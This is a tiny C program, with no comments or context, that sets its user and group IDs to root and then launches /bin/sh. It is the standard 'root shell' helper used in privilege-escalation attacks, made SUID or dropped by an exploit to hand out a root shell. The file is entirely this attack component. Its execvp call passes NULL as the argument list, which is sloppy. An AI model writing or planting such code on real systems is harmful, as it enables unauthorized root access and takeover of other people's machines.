#include <unistd.h>
#include <sys/types.h>
main() { setuid(0); setgid(0); execvp("/bin/sh", NULL); } 
